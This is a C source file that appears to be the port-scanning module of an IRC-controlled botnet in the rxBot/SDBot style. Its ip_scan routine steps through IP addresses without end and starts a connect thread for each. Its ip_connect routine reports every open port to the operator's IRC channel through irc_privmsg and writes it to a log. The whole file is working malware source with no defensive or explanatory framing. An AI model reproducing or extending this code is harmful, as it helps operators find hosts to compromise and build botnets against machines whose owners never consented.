#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SCAN

// checks ip for open port
DWORD WINAPI ip_connect(LPVOID param)
{
	static char sendbuf[IRCLINE];

	scans scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)scan.port);
	ssin.sin_addr = scan.addy;

	SOCKET sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock != INVALID_SOCKET) {
		DWORD err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		threads[scan.threadnum].sock = sock;
		if (err != SOCKET_ERROR) {
			sprintf(sendbuf,"[SCAN]: IP: %s Port: %d is open.", finet_ntoa(scan.addy), scan.port);
			irc_privmsg(scan.sock, scan.chan, sendbuf, scan.notice);
			addlog(sendbuf);
		}
	} 
	fclosesocket(sock);

	return 0;
}

// scan a range of IPs for an open port
DWORD WINAPI ip_scan(LPVOID param)
{
	DWORD id, host;
	HANDLE th;
	char str[128];

	scans scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		sprintf(str, "[SCAN]: Scanning IP: %s, Port: %d.", finet_ntoa(scan.addy), scan.port);
		strncpy(threads[scan.threadnum].name, str, sizeof(threads[scan.threadnum].name)-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(50);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = fntohl(host);
		host += 1;
		host = fhtonl(host);
		memcpy(&scan.addy, &host, 4);
	}
	clearthread(scan.threadnum);

	return 0;
 }
#endif
